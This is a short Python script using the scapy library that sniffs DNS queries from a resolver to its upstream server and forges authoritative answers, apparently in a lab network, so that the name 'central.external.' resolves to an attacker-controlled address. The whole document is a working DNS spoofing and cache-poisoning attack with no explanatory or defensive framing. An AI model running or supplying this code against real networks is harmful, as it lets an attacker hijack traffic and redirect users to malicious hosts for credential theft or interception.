from scapy.all import *

ATTACKER_IP = "10.132.27.146"
DNS_SERVER = "10.132.27.47"
UPSTREAM = "10.132.27.98"
NAME = b"central.external."

def spoof(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNSQR].qname == NAME:
        print(f"[+] Spoofing DNS id={pkt[DNS].id} for {NAME.decode()} -> {ATTACKER_IP}")

        reply = (
            Ether(dst=pkt[Ether].src) /
            IP(src=UPSTREAM, dst=DNS_SERVER) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                ra=1,
                rd=pkt[DNS].rd,
                qd=pkt[DNS].qd,
                ancount=1,
                an=DNSRR(
                    rrname=NAME,
                    type="A",
                    ttl=30,
                    rdata=ATTACKER_IP
                )
            )
        )

        sendp(reply, iface="eth0", verbose=False)

sniff(
    iface="eth0",
    filter="udp and src host 10.132.27.47 and dst host 10.132.27.98 and dst port 53",
    prn=spoof,
    store=0
)
